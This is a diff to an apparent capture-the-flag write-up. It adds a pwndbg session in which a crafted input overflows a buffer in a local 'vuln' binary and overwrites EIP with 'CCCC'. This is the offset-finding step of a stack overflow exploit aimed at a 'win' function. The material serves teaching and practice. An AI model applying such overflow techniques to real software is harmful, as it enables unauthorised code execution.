@@ -427,3 +427,28 @@ Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX
 pwndbg> p win
 $1 = {<text variable, no debug info>} 0x8049336 <win>
 ```
+
+```
+pwndbg> run
+Starting program: /home/connor/Desktop/vuln 
+[Thread debugging using libthread_db enabled]                                                              
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+How Many Bytes will You Write Into the Buffer?
+> 100
+Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATESTBBBBBBBBBBBBBBBBCCCC
+Ok... Now Where's the Flag?
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────
+ EAX  0x0
+*EBX  0x42424242 ('BBBB')
+ ECX  0x0
+*EDX  0xf7e218a0 (_IO_stdfile_1_lock) ◂— 0x0
+*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
+*ESI  0x8049640 (__libc_csu_init) ◂— endbr32 
+*EBP  0x42424242 ('BBBB')
+*ESP  0xffffd5f0 ◂— 0xffffff0a
+*EIP  0x43434343 ('CCCC')
+```
